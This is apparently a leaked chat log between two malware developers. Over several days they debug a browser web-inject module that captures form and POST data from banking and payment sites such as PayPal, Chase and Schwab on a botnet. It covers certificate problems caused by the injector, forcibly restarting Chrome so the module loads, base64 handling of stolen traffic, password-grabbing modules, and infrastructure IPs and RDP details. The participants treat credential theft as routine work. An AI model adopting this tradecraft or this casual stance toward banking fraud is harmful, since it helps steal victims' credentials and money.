+[08.12.21 11:50:50] jaime: https://privnote.com/A1jeGiSh#C3bW9HINj this is the format
+[08.12.21 11:55:27] hammer: where do I get it for him?
+[08.12.21 11:55:58] jaime: I did it on my server
+[08.12.21 11:56:12] jaime: I will add raw POST logging to the file
+[08.12.21 11:56:32] hammer: to a separate one?
+[08.12.21 11:56:48] jaime: Do you think it's better in a separate one?
+[08.12.21 11:57:04] hammer: so it doesn't get in the way
+[08.12.21 11:57:15] hammer: but then it would be hard to compare with another log?
+[08.12.21 11:57:40] hammer: now, i'll text frank to tell him how to do it
+[08.12.21 12:00:02] hammer: look what they give out on newegg and ebay
+[08.12.21 12:00:04] hammer: Secure Connection Failed
+
+An error occurred during a connection to newegg.com. Peer's certificate has an invalid signature.
+
+Error code: SEC_ERROR_BAD_SIGNATURE
+[08.12.21 12:00:14] hammer: doesn't even start loading
+[08.12.21 12:00:19] hammer: Peer's certificate has an invalid signature.
+[08.12.21 12:00:27] hammer: it's not because of the injector?
+[08.12.21 12:00:52] jaime: Anything's possible! Is it loaded now?
+[08.12.21 12:01:04] hammer: yes, the module is running
+[08.12.21 12:01:14] hammer: unload and recheck?
+[08.12.21 12:01:29] jaime: Yes. What kind of browser?
+[08.12.21 12:01:47] hammer: ff longsuffering
+[08.12.21 12:01:55] hammer: let me check on chrome
+[08.12.21 12:04:27] hammer: it's fine on chrome
+[08.12.21 12:05:29] jaime: Looks like ssl cache didn't clear
+[08.12.21 12:09:43] hammer: well, look what I noticed so far
+maybe it's not true, and just coincidence, but it turns out that the delayed arrival of the logpost to the repository occurs when you work with chrome
+i checked my ff and it went right to the minute and then i switched to chrome and nothing happened.
+[08.12.21 12:21:20] jaime: I don't know how to explain it!
+[08.12.21 12:24:36] hammer: yes it works fine, basically it loads fast, not counting all that stuff on the main page like mylkom
+[08.12.21 12:25:18] hammer: but there's another problem, it's not supported by some sites, like chase, and they redirect to edge and edge doesn't work for us
+[08.12.21 12:34:56] hammer: released the module, Error code: SEC_ERROR_BAD_SIGNATURE on newegg and ebay no
+[08.12.21 12:35:05] hammer: so it has some effect
+[08.12.21 12:35:31] hammer: waiting for logpost here
+[08.12.21 12:41:22] jaime: everything is glitchy.
+[08.12.21 12:41:42] jaime: Did you refresh the page?
+[08.12.21 12:41:56] hammer: yes.
+[08.12.21 12:42:29] jaime: It didn't help?
+[08.12.21 12:43:55] hammer: Nope.
+[08.12.21 12:44:49] jaime: It happens if certificate cache was not cleared
+[08.12.21 12:45:29] jaime: You logged in without module, cache stayed. But usually after refresh it was deleted.
+[08.12.21 12:49:23] hammer: no, not like that, when I go under a module, I get these messages, refreshing the page doesn't help
+[08.12.21 12:49:32] hammer: but when unmodded, it loads fine
+[08.12.21 13:26:18] jaime: And you watched FF on debug?
+[08.12.21 13:45:11] jaime: So I added logs. Shall we watch it?
+[08.12.21 13:48:51] hammer: um, would it be necessary to restart the module?
+[08.12.21 13:48:59] hammer: I'm still watching from chrome
+[08.12.21 13:50:35] jaime: yes, I have to give it to caesar.
+[08.12.21 13:51:24] hammer: resend it
+[08.12.21 13:51:43] hammer: as long as I'm with it, I'll release it and start a new one
+[08.12.21 13:52:13] jaime: Looking ebay on FF all ok even opens fast
+[08.12.21 13:52:20] jaime: 95 FF 64
+[08.12.21 13:52:37] hammer: 10?
+[08.12.21 13:53:04] jaime: Yes 10
+[08.12.21 13:53:19] jaime: You don't have FF profiles?
+[08.12.21 13:53:42] hammer: Nope.
+[08.12.21 13:54:30] jaime: User\AppData\Local\Mozilla\Firefox\Profiles and what's in this folder?
+[08.12.21 13:55:09] hammer: ah, wait.
+[08.12.21 13:55:17] jaime: User\AppData\Roaming\Mozilla\Firefox\Profiles and here?
+[08.12.21 13:57:03] hammer: Check.
+[08.12.21 13:57:19] hammer: what exactly do you need from there?
+[08.12.21 13:58:05] jaime: Just a dir from the folder
+[08.12.21 13:58:47] jaime: If there is more than one profile, it may take a wrong folder, and the cert database may be broken
+[08.12.21 13:59:45] jaime: Do you need answers in the dross log?
+[08.12.21 14:00:28] hammer: There are two profiles C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\s579v85b.default
+and C:\Users\user\AppData\Roaming\Mozilla\Firefox\Profiles\fqwi65te.default-release
+[08.12.21 14:00:41] hammer: Let's go with them.
+[08.12.21 14:01:00] jaime: There must be a problem.
+[08.12.21 14:01:11] jaime: Can you keep one?
+[08.12.21 14:01:15] hammer: woof!
+[08.12.21 14:01:40] hammer: s579v85b.default is dwarf, it weighs in kilobytes
+[08.12.21 14:01:48] hammer: maybe kill it?
+[08.12.21 14:02:13] jaime: https://privnote.com/OWkhDdxl#fuTbNSVUw this will be the log, I don't know how hard it is to work with
+[08.12.21 14:02:35] jaime: Maybe kill them both? It will recreate on startup with it and see
+[08.12.21 14:03:03] hammer: ok, i'll finish with chrome and check it out
+[08.12.21 14:03:13] hammer: will this log be written separately?
+[08.12.21 14:03:21] jaime: Waiting for Caesar until I see him
+[08.12.21 14:03:52] jaime: Yes in separate file, dpost.log in C:/TEMP send and reply
+[08.12.21 14:20:22] hammer: started ff after deleting profiles
+[08.12.21 14:20:38] hammer: it didn't load correctly, there was no item
+[08.12.21 14:20:54] hammer: got the message Your Firefox profile cannot be loaded. It may be missing or inaccessible I confirmed and browser closed
+[08.12.21 14:23:11] hammer: same song on reopening
+[08.12.21 14:23:31] hammer: all in all, my browser crashed because of this, now I'll kill the module, reopen it and start over
+[08.12.21 14:25:09] jaime: hold on now
+[08.12.21 14:25:51] jaime: firefox -P run it like this
+[08.12.21 14:26:17] jaime: It will ask you to create a profile
+[08.12.21 14:34:43] hammer: went to get tea
+[08.12.21 14:34:49] hammer: I'm on it.
+[08.12.21 14:35:01] hammer: adam can't upload a module?
+[08.12.21 14:40:35] jaime: i don't know! I'm afraid of him! :)
+[08.12.21 14:41:19] jaime: I'll write it now.
+[08.12.21 14:42:22] hammer: let me write
+[08.12.21 14:43:21] jaime: I did! :)
+[08.12.21 14:52:13] hammer: Now it's loading.
+[08.12.21 14:52:26] hammer: if you create a new profile
+[08.12.21 14:52:51] hammer: well, how many users have multiple profiles?
+[08.12.21 14:52:59] hammer: can't you cut them off?
+[08.12.21 14:53:12] hammer: so there won't be such a mess with certificates?
+[08.12.21 15:02:33] jaime: I need to think.
+[08.12.21 15:02:45] jaime: Adam's not talking.
+[08.12.21 15:14:01] hammer: I restarted just to see, it loads fine every time
+[08.12.21 15:14:17] hammer: but unfortunately no speed boost
+[08.12.21 15:21:31] jaime: Is it that bad?
+[08.12.21 15:21:46] jaime: I'm watching it tolerably well.
+[08.12.21 15:22:20] jaime: I wouldn't even notice it.
+[08.12.21 15:22:32] hammer: sometimes it takes 10+ seconds to react to a new transition
+[08.12.21 15:23:58] jaime: let's run my bot
+[08.12.21 15:24:49] hammer: no way, I won't give you a sample because cryptopanel is lying around
+[08.12.21 15:26:36] jaime: And yesterday's?
+[08.12.21 15:27:05] hammer: it's destroyed(
+[08.12.21 15:27:39] jaime: I have it, but I have no password to the archive
+[08.12.21 15:28:18] hammer: m, yesterday's history is incomplete, no password
+[08.12.21 15:28:30] hammer: Never mind, it's not critical
+[08.12.21 15:29:00] jaime: I don't want to know how slow it is
+[08.12.21 15:29:59] hammer: I'll get the cryptopanel fixed
+[08.12.21 15:30:22] jaime: Okay! Caesar showed up.
+[08.12.21 15:31:01] hammer: [jhjij? f nj flfv b vyt yt jndtxftn
+[08.12.21 15:31:10] hammer: good, 'cause adam's not answering me either.
+[08.12.21 15:36:20] hammer: *_<Htx]qed+?G)M@
+https://www.sendspace.com/file/oezufg
+https://www.sendspace.com/delete/oezufg/a4ceb0efbebdf927a62343635bff9f87
+[08.12.21 15:39:45] jaime: Got it. Launching.
+[08.12.21 15:40:32] jaime: 109.248.144.21
+[08.12.21 15:46:05] jaime: All Caesar updated tinjectDll
+[08.12.21 15:46:17] hammer: [jhjij
+[08.12.21 15:46:20] hammer: ok
+[08.12.21 15:46:42] hammer: 2021-12-08 15:45:46 tinjectDll VERS browser Build date: Dec 8 2021 18:35:06
+[08.12.21 15:46:49] hammer: from your machine
+[08.12.21 15:51:16] hammer: I'll be gone 10 minutes.
+[08.12.21 16:22:11] hammer: how's ff?
+[08.12.21 16:23:58] jaime: 74.50.111.156 but use vnc
+[08.12.21 16:30:01] jaime: I think it's okay!
+[08.12.21 16:30:38] hammer: forget it then)
+[08.12.21 16:30:54] hammer: Let them use Chromium, otherwise they're just making too many browsers
+[08.12.21 16:31:35] jaime: I thought it was a bit slow when I typed the wrong url
+[08.12.21 16:32:05] jaime: I tried to use schwab and made a mistake, it took me a while to get it right
+[08.12.21 16:57:02] jaime: You can compare what we have there and in the admin area
+[08.12.21 16:57:14] jaime: I really have no idea how.
+[09.12.21 10:26:26] jaime: Hi!
+[09.12.21 10:27:18] jaime: Yesterday with Frank we changed the format of data transfer to it. We only updated it to the auction version.
+[09.12.21 10:52:13] hammer: Hi, I'll put it on auction later, for now on dnog
+[09.12.21 13:41:33] hammer: did frank say how long he was gone?
+[09.12.21 13:42:00] hammer: found him a place to go
+[09.12.21 13:58:07] jaime: haven't seen him today at all!
+[09.12.21 13:58:32] jaime: We discussed with him yesterday, I showed him the result. Implemented today, wanted to see.
+[09.12.21 13:59:12] hammer: we'll see, I'm double-checking what didn't come from another browser, then I'll reset the bot
+[09.12.21 15:12:22] hammer: frank is not responding(
+[09.12.21 15:12:31] hammer: he didn't text you?
+[09.12.21 15:29:35] jaime: no he didn't!
+[10.12.21 14:00:44] hammer: Ghbdtn
+[10.12.21 14:00:46] hammer: Hi.
+[10.12.21 14:00:55] hammer: did you make any changes today?
+[10.12.21 14:01:15] jaime: hi!
+[10.12.21 14:01:19] jaime: No, I didn't.
+[10.12.21 14:01:27] jaime: haven't checked the old ones yet
+[10.12.21 14:40:15] hammer: i gave him examples yesterday where it didn't come, did he show you?
+[10.12.21 15:27:43] jaime: You mean Frank? No, I didn't. Did you shoot the test one?
+[10.12.21 15:28:58] jaime: He wrote me, asking if we changed the format everywhere? I said only on the test one and only on the auction one.
+[10.12.21 15:29:13] jaime: Maybe he didn't translate something else
+[10.12.21 15:37:55] hammer: I gave it to him yesterday
+[10.12.21 15:38:18] hammer: yesterday launched on Auk, but there is a problem, my storage does not show the date, I can not see whether it came or not
+[10.12.21 15:39:02] hammer: date as in all these data that comes into the store, I just have nothing there, there are links to the logpost. but what's inside, can not be seen
+[10.12.21 15:39:24] hammer: i think it's an admin issue, because everything was fine on the dnog
+[10.12.21 15:39:28] hammer: told the frank
+[10.12.21 15:54:04] jaime: so did you run the test on auk?
+[10.12.21 15:54:36] jaime: tinjectDll? There because of data in b64 maybe he couldn't parse it?
+[10.12.21 16:13:20] hammer: tinjectDll
+[10.12.21 16:13:34] hammer: can you send me the log?
+[10.12.21 16:14:58] hammer: https://www.paypal.com/signin 2021-12-10 15:42:30.666019 here, for example, logpost entry
+[10.12.21 16:15:15] hammer: I click on the link, it goes to the page, but there's no date
+[10.12.21 16:15:59] hammer:
+[10.12.21 16:16:07] hammer:
+[10.12.21 16:16:12] hammer:
+[10.12.21 16:16:45] hammer: click the paper clip at the top right, there will be files
+[10.12.21 16:41:49] jaime: what date? :)
+[10.12.21 16:42:31] jaime: Date of time of writing to the repository, entering the page?
+[10.12.21 16:43:57] jaime: I don't pass date/time, separately.
+[10.12.21 16:45:01] hammer: date as in data
+[10.12.21 16:45:21] hammer: it is so signed in the DATA repository
+[10.12.21 16:47:16] hammer: I also looked at the 9th 2021-12-09 13:34:38 tinjectDll VERS browser Build date: Dec 9 2021 12:06:42 on the dnog and there's no storage problem
+[10.12.21 16:47:40] jaime: So the new tinhect is only on auction
+[10.12.21 16:48:19] jaime: just there they changed data field transfer to base64
+[10.12.21 16:48:27] jaime: Throw the log
+[10.12.21 16:48:40] hammer: I pinned it to you from Auction
+[10.12.21 16:48:52] hammer: I rolled the car back
+[10.12.21 16:49:09] jaime: Where?
+[10.12.21 16:49:25] hammer: where what?
+[10.12.21 16:49:30] jaime: There's a link to paypal
+[10.12.21 16:49:43] hammer: The paper clip at the top right.
+[12/10/221 16:50:05] jaime: Oh! :)
+[10.12.21 16:50:06] hammer: click, it will show you the files I uploaded
+[10.12.21 16:50:31] jaime: I'm not familiar with this technology! :)
+[10.12.21 16:50:37] hammer: it's from paypal. i have others
+[10.12.21 16:50:49] hammer: i just found it myself yesterday, i download it, but it does not show.
+[10.12.21 16:50:56] hammer: then I found it
+[10.12.21 16:51:27] hammer: well, everywhere I poke into the vault, it shows nowhere(
+[10.12.21 16:51:45] hammer: that makes me wonder if it did or didn't work
+[10.12.21 16:52:02] jaime: ``
+UE9TVCAvZ3RzMWMzIEhUVFAvMS4xDQpIb3N0OiBvY3NwLnBraS5nb29nDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjo5NS4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzk1LjANCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXA7cT0xLGRlZmxhdGUsYnI7cT0wDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jc3AtcmVxdWVzdA0KQ29udGVudC1MZW5ndGg6IDgzDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQpQcmFnbWE6IG5vLWNhY2hlDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KDQowUTBPME0wSzBJMAkGBSsOAwIaBQAEFMcueYrd/2E0s7rtR0K4u8bAJAdjBBSKdH+vhc3ulc09nNDiRhTzcTUdJwIQJ1XLe8gbSBsKAAAAASJLjAA=
+```
+[10.12.21 16:52:10] hammer: I gave him the logs yesterday, there was partially no logpost at all, partially was, but not all
+[10.12.21 16:52:30] jaime: https://www.base64decode.org/ insert this hat here
+[10.12.21 16:53:08] hammer: POST /gts1c3 HTTP/1.1
+Host: ocsp.pki.goog
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip;q=1,deflate,br;q=0
+Content-Type: application/ocsp-request
+Content-Length: 83
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+0Q0OM0K0I0 +�.ya4GB$ct=Fq5''U{H
+���"K�
+[10.12.21 16:53:21] hammer: so what did it get us?
+[10.12.21 16:53:32] jaime: Aha! There's binary data down there, that's why we switched to b64
+[10.12.21 16:53:51] jaime: I don't think Frank did, or decoded it
+[10.12.21 16:54:02] hammer: put it all back, nothing is clear(
+[10.12.21 16:54:53] jaime: only on tinject in battle as usual
+[10.12.21 16:55:00] hammer: ok. it's no problem, on monday let it work to show
+[10.12.21 16:55:22] jaime: He thinks there are symbols causing problems, we'll get rid of them there
+[10.12.21 16:55:23] hammer: so it seems, as far as I see, the logpost goes, but you can't view it
+[10.12.21 16:55:51] jaime: I offered him to make two fields, one in base64 and another the old one
+[10.12.21 16:56:26] jaime: He said no need
+[10.12.21 17:45:04] hammer: have a nice weekend
+[12/13/21 16:14:25] hammer: Hey.
+[13.12.21 16:14:43] hammer: you didn't get in touch with frank about b64 format?
+[13.12.21 16:14:58] hammer: you can't read the logpost because of this?
+[13.12.21 16:17:01] hammer: and I also have you from chrome logs, the browser does not start, there is a black command line window, in the manager a couple of processes, but they die and the browser does not start
+[12/13/21/16:17:07] hammer: now
+[12/13/21 16:17:16] hammer: and so on several times in a row
+[12/13/21 16:20:06] hammer:
+[12/13/221 16:20:14] hammer:
+[12/13/21 16:20:21] hammer:
+[12/13/221 16:20:26] hammer:
+[12/13/21 17:02:49] jaime: Hi!
+[12/13/21 17:02:57] jaime: If you wrote! Nothing came!
+[12/13/21 17:05:12] hammer: did it come now?
+[13.12.21 17:06:06] hammer: Contact frank about the wrong transcript.
+[12/13/21/17:06:19] hammer: we were watching on friday
+[12/13/21/17:06:38] jaime: Got it. Okay.
+[12/13/21 21 17:06:52] hammer: and also, look there in the paperclip, are there any logs for today?
+[12/13/21 17:07:20] jaime: No dpost log?
+[12/13/21 17:07:26] hammer: chrome logs, browser won't start, black command line window, a couple of processes in dispatcher, but they die and browser won't start, and so on several times in a row
+[13.12.21 17:07:43] hammer: no, there is no dpost, because the browser doesn't start)
+[13.12.21 17:08:23] hammer: that was what I sent, there were more, but I thought that two attempts to start will be enough
+[12/13/221 17:08:30] jaime: What about chrome 64?
+[12/13/21/17:08:34] hammer: yes
+[12/13/221 17:08:43] hammer: 10*64, so is 64
+[13.12.21 17:09:13] hammer: similar happened last week, I only managed to open it for the third time
+[13.12.21 17:09:27] hammer: can you send me the log?
+[12/13/221 17:09:51] hammer: and today I tried it six times in a row, it wouldn't open
+[12/13/221 17:10:09] jaime: That's weird. I'll check my logs now.
+[12/13/221 17:10:12] hammer: went to ip, then went back to chrome and only then started
+[12/13/221 17:10:36] hammer: these are from today, I'll send you the logs from last week where it happened.
+[12/13/21/17:11:40] hammer:
+[12/13/21/17:11:45] hammer:
+[12/13/21 17:11:49] hammer:
+[12/13/221 17:12:16] hammer: there's a dpost because on the third time the browser did start
+[12/13/221 17:14:01] hammer: Version 96.0.4664.93 (Official Build) (64-bit) version is the same as last week
+[12/13/221 17:17:57] jaime: 12/6/2021 6:41:07 AM url=https://mail.yandex.com/, matches url=https://*/* damn!
+[12/13/221 17:18:06] jaime: Where's the config from?
+[12/13/221 17:22:35] jaime: Yeah I see, took a long time to kill chrome. Maybe there was an update going on.
+[12/13/21 17:24:15] jaime: There is a trick, on startup look for chrome processes and kill them in order to run with the right keys for us. For some reason the process didn't die for a long time. I noticed this when upgrading chrome.
+[12/13/221 17:24:59] jaime: I need to see if I can distinguish the update and leave it untouched.
+[12/13/221 17:25:48] hammer: well, there was no update
+[12/13/21 17:25:58] hammer: hold on, I'll compare with last week's version
+[13.12.21 17:26:21] hammer: but the module is also a tinge, it shouldn't pull the config, right?
+[12/13/221 17:26:22] jaime: That's weird. According to my observations.
+[13.12.21 17:26:43] jaime: He doesn't pull anything himself.
+[13.12.21 17:26:47] hammer: Chrome version: 96.0.4664.93
+[13.12.21 17:26:52] hammer: Same version
+[13.12.21 17:27:20] hammer: frank will fix the date. i'll check again. if it repeats, i'll let you know
+[13.12.21 17:27:25] hammer: *frank
+[12/13/221 17:27:38] jaime: I have chrome zombie in my logs, it's when chrome hangs and doesn't die
+[12/13/221 17:28:04] hammer: there you start chrome, two processes appear in manager
+[12/13/221 17:28:14] hammer: hang for a few seconds and then die
+[12/13/21 17:29:11] jaime: that's normal. we have to restart them.
+[12/13/21 17:31:13] jaime: pwgrab didn't work in parallel there?
+[12/13/21 17:31:33] hammer: no
+[13.12.21 17:31:46] hammer: it's a tost botnet, it doesn't start anything from the modules by itself
+[13.12.21 17:31:53] hammer: only manually
+[13.12.21 17:32:29] jaime: And what about config file with injections?
+[13.12.21 17:32:37] hammer: don't know
+[12/13/221 17:34:15] jaime: Checking. Well, no, it starts right away.
+[12/13/221 17:34:29] hammer: it doesn't start for me either
+[12/13/221 17:34:54] jaime: But I see in the log it didn't really die
+[13.12.21 17:35:50] jaime: Theoretically, of course, there is a probability that the program will crash during injection, but not so much
+[13.12.21 17:37:04] hammer: If that's the case, let's pretend it never happened, if it happens again, I'll write
+[12/13/221 17:37:25] hammer: now I need frank to fix the DATA in the vault
+[12/13/221 17:38:07] jaime: let's see, maybe there will be a pattern. Anything can happen, it's better to find and fix something right away.
+[12/13/221 17:38:36] jaime: Frank and I contacted him, I think we discussed everything. He understood me.
+[12/13/221 17:40:54] jaime: I have run zombie 30 times in my place and never saw it. Pay attention maybe it's after a restart or something. Maybe there will be some tip to understand and explain.
+[12/13/21/17:41:02] hammer: okay.
+[12/14/21 15:11:33] hammer: Hi.
+[14.12.21 15:12:06] hammer: those changes, so that the logpost date was correct in the admin panel, they require some changes in the module? or it's only in the admin panel
+[14.12.21 15:12:30] hammer: you still haven't fixed the frank
+[14.12.21 15:29:00] jaime: Hi!
+[14.12.21 15:29:10] jaime: No, I'm not doing anything as of yet
+[14.12.21 15:29:15] jaime: Waiting for Frank.
+[14.12.21 15:30:10] jaime: If he write me that it does not work, we will change the module.
+[12/15/21 14:25:04] hammer: Hi.
+[15.12.21 14:25:28] hammer: Frank said, "We agreed with Jaime that he will make a feature for tests, I'll check if it is ready".
+[15.12.21 14:25:34] hammer: ready?
+[15.12.21 14:25:40] hammer: otherwise he's gone again
+[12/15/21 14:30:55] jaime: hi!
+[12/15/21 14:31:19] jaime: :) i don't know what you're talking about :)
+[12/15/221 14:32:01] jaime: he asked me if b64 is in a separate field, I said no and he disappeared.
+[12/15/221 14:32:19] jaime: If you want it in a separate field, it will take half an hour.
+[12/15/221 14:33:55] hammer: I guess so.
+[12/15/221 14:34:35] hammer: but I have to free my car for another test, not wait for it
+[12/15/221 14:37:46] jaime: Ok I'll do it today. I'll go get the little one and do it.
+[12/15/221 14:47:38] hammer: "Let's probably agree that I'll try to finish testing the logpost transfer code by Thursday night and upload it to the auction.
+Jamie writes that the data changes if it's binary.
+I don't really want to make changes to the new module as it is, as there's a very high probability that everything will stop working altogether.
+In terms of formgrabber.
+So far I think our shortcomings are bugs related to conversion of binary data
+"
+[12/15/221 14:47:42] hammer: unsubscribe it
+[12/15/221 14:48:10] hammer: rolling machine back, we'll try again tomorrow
+[15.12.21 16:09:59] jaime: I might send him the data myself today
+[15.12.21 16:10:28] hammer: ok, I've borrowed some machines for trick2
+[15.12.21 16:31:48] jaime: added changes, waiting for Caesar to make the update
+[15.12.21 16:33:58] hammer: [jhjij
+[15.12.21 16:34:01] hammer: ok
+[15.12.21 16:34:13] hammer: no one will see him tomorrow
+[16.12.21 11:32:18] hammer: Hey, still no caesar
+[16.12.21 11:36:18] jaime: Hi! I've been watching it since this morning. :(
+[16.12.21 11:36:23] jaime: Maybe he got sick?
+[16.12.21 11:38:28] hammer: I don't know, I'll ask Garfield.
+[16.12.21 16:21:05] hammer: text adam, he'll upload it
+[16.12.21 16:28:16] jaime: okay.
+[16.12.21 16:41:30] jaime: I wrote him down, passed him the module
+[16.12.21 16:47:16] hammer: great
+[16.12.21 16:50:23] hammer: I've borrowed some machines for the night for trick2, we'll see what happens tomorrow
+[16.12.21 16:50:46] hammer: and he wrote that he took the module?
+[16.12.21 16:53:35] jaime: no he asked me to duplicate it in toad
+[16.12.21 16:53:47] jaime: I duplicated it, I'm waiting
+[16.12.21 16:58:52] hammer: under the name tinject, right?
+[16.12.21 16:59:43] jaime: yeah
+[16.12.21 16:59:50] hammer: texted him
+[16.12.21 17:00:35] hammer: and then frank came in
+[16.12.21 17:00:51] jaime: i put it with another name, there's an l at the end, like logged
+[16.12.21 17:00:59] hammer: tinjectDll
+[16.12.21 17:01:16] hammer: another l?
+[16.12.21 17:01:20] hammer: tinjectDll
+[16.12.21 17:01:22] hammer: so?
+[16.12.21 17:01:26] jaime: webinject64l.dll
+[12/16/21 17:01:39] jaime: that's what Caesar does next! :)
+[16.12.21 17:01:54] hammer: it's a test one anyway
+[16.12.21 17:02:04] hammer: adam will fill it like tinjectDll
+[16.12.21 17:07:38] hammer: > fill only as tinjectDll64
+[16.12.21 17:07:47] hammer: fill as tinjectDll64
+[16.12.21 17:07:59] hammer: that's ok, it won't start by itself anyway
+[16.12.21 17:08:26] jaime: I don't know
+[16.12.21 17:08:48] jaime: The main thing is to have a command to start
+[16.12.21 17:09:04] hammer: I start there manually
+[16.12.21 17:09:49] hammer: where will the log be written?
+[16.12.21 17:10:04] jaime: With:/TEMP
+[16.12.21 17:10:19] hammer: self-create folder?
+[16.12.21 17:10:24] jaime: dpost.log
+[16.12.21 17:10:35] jaime: No need to create folder
+[16.12.21 17:10:41] hammer: okay.
+[16.12.21 17:10:52] jaime: Just in case we run it in battle
+[16.12.21 17:11:04] hammer: no, i'll take the botnet
+[16.12.21 17:11:23] hammer: no caesar, so I had to hide old test one
+[16.12.21 17:12:36] hammer: went to get your paycheck?
+[16.12.21 17:13:57] jaime: no, not yet :)
+[16.12.21 17:14:31] jaime: Waiting for the rush to die down.
+[16.12.21 17:14:43] jaime: How do you think bitcoin will grow?
+[16.12.21 17:14:47] hammer: Yeah, I'm thinking the same thing, not to crowd the cash register window
+[16.12.21 17:15:08] jaime: Or withdraw right away?
+[16.12.21 17:15:11] hammer: it already went down like that a few months ago
+[16.12.21 17:15:19] hammer: then it went up again
+[16.12.21 17:15:45] hammer: hopefully it will reverse
+[16.12.21 17:16:02] hammer: I'll take it out, I don't know what to do about the rest
+[16.12.21 17:16:46] jaime: It would be a shame if it goes up!
+[12/16/21 17:17:04] jaime: I've already bought some shiat coins in hopes of growing! :)
+[16.12.21 17:17:18] hammer: And if it fails completely
+[12/16/21 17:17:34] jaime: I'm scared
+[16.12.21 17:27:39] hammer: that's it.
+[16.12.21 17:36:33] jaime: frank ask what to run?
+[16.12.21 17:44:36] hammer: start what?
+[16.12.21 17:47:35] jaime: tinjectDll start
+[16.12.21 17:48:11] hammer: i don't understand(
+[16.12.21 17:48:25] hammer: adam filled it, I start the machine myself
+[16.12.21 17:48:49] hammer: will frank have to do something with it too?
+[16.12.21 17:51:23] jaime: And Frank is going to start it himself
+[12/16/21/17:51:32] jaime: He wants the data.
+[12/17/21/18:38:34] hammer: Hi.
+[12/17/21 18:40:06] jaime: Hi!
+[17.12.21 18:41:03] hammer: there's an error in the module
+[12/17/21 18:41:19] hammer: 1
+[17.12.21 18:41:25] hammer: there's a connection
+[17.12.21 18:41:28] hammer: okay. look
+[12/17/21/18:41:49] jaime: any data?
+[12/17/21 18:42:00] hammer: > here's the log
+> code 200
+> 807600 size
+> which means that bot understands module error as a download error and downloads several times
+> in general let's make a logged module and see how it runs
+[17.12.21 18:42:12] hammer: no. the bot can't download the module because it's broken
+[17.12.21 18:42:32] hammer: need to rebuild
+[17.12.21 18:42:37] hammer: and reload
+[12/17/21/18:43:03] jaime: Man, I wish Caesar was here. I don't think that's how Adam poured it.
+[17.12.21 18:43:17] hammer: let's wait till monday then
+[17.12.21 18:43:20] jaime: It never happened.
+[17.12.21 18:43:37] jaime: I'll have no problem rebuilding and giving it to Adam
+[17.12.21 18:43:57] jaime: Let's do it, I don't mind
+[17.12.21 18:44:05] jaime: Did Adam send you this?
+[17.12.21 18:44:27] hammer: yeah, the bots couldn't get the module to run. he looked in the logs
+[12/17/21/18:45:02] hammer: Here's the reason.
+[17.12.21 18:45:13] hammer: "bot understands the module error as a download error and downloads several times"
+[17.12.21 18:45:14] jaime: So only you had to run it.
+[17.12.21 18:45:37] hammer: well, I can not start it, the module itself does not download from the server
+[17.12.21 18:45:52] hammer: tinjectDll start Unable to load module from server 2021-12-17 18:34:45.907672
+[17.12.21 18:45:59] hammer: I get this from admin
+[12/17/221 18:46:17] hammer: and the temp folder is empty
+[12/17/221 18:46:17] jaime: I suspect caesar shammed something there.
+[17.12.21 18:46:40] hammer: that's why i say let's wait till monday. maybe he'll come
+[12/17/21/18:47:15] jaime: Okay. I'm checking my module, I'm downloading everything.
+[17.12.21 18:47:21] hammer: either rebuild, the bots are alive, I'll give them a go
+[12/17/21/18:47:27] hammer: what do we do?
+[17.12.21 18:47:36] jaime: let me rebuild
+[12/17/21 18:48:27] hammer: "well, let him make a logical module and see how it works"
+[17.12.21 18:48:33] hammer: how do you understand that?
+[17.12.21 18:48:48] hammer: it is logged anyway, but he writes only when he starts
+[12/17/221 18:49:02] jaime: If he is logged, you can see if he was given control or not
+[12/17/221 18:49:09] jaime: So it was logged
+[12/17/21 18:49:13] jaime: Any logs?
+[12/17/21 18:49:17] hammer: no
+[12/17/21 18:49:21] hammer: the folder's empty
+[12/17/21 18:49:35] hammer: Temp, right?
+[12/17/21 18:49:42] jaime: yes
+[17.12.21 18:49:47] hammer: There's nothing.
+[12/17/221 18:50:59] jaime: as soon as bot called Start from module it creates file with information about date of build
+[17.12.21 18:51:35] hammer: it means the module has not started, because there is no record of the build in admin area either
+[12/17/221 18:51:56] jaime: 08/12/2021 16:13:04 WebInject build Dec 8 2021 16:13:01 (x64)
+[12/17/221 18:52:05] jaime: That's the first thing the module writes
+[17.12.21 18:52:12] hammer: yes. i've seen it in the admin area
+[17.12.21 18:52:13] jaime: So it looks like it never downloaded
+[17.12.21 18:52:36] hammer: but this time there was no build version
+[12/17/21 18:52:53] hammer: adam says it downloaded but won't start
+[17.12.21 18:53:20] jaime: the hell with it with the admin log file should have been!
+[17.12.21 18:53:34] hammer: wait
+[12/17/21 18:53:51] hammer: 185.64.104.213:31117)
+[17.12.21 18:53:55] hammer: via rdp
+[12/17/221 18:54:38] jaime: what about authorization?
+[17.12.21 18:54:48] hammer: asking for data?
+[12/17/21 18:54:55] jaime: yeah.
+[12/17/21/18:55:16] hammer: user JohnJackson21
+[12/17/21 18:55:50] hammer: is it open?
+[12/17/21 18:56:23] jaime: yeah.
+[17.12.21 18:56:33] hammer: there's a Temp folder on the C drive
+[17.12.21 18:56:37] hammer: empty
+[12/17/221 18:57:00] hammer: the settings show hidden files, I thought maybe hidden, but there's nothing
+[17.12.21 18:57:12] hammer: and admin writes that the module is not downloaded
+[17.12.21 18:57:15] jaime: Run the module again
+[17.12.21 18:57:19] hammer: adam says it's working
+[12/17/21 18:57:48] jaime: There's a bug somewhere! :)
+[12/17/221 18:58:23] hammer: any other indication that the module has started?
+[17.12.21 18:59:22] hammer: put it on start
+[17.12.21 18:59:26] jaime: you should see black windows
+[17.12.21 18:59:33] hammer: well, they aren't
+[17.12.21 18:59:39] hammer: start your browser
+[17.12.21 18:59:45] hammer: I'll see if there's a logpost
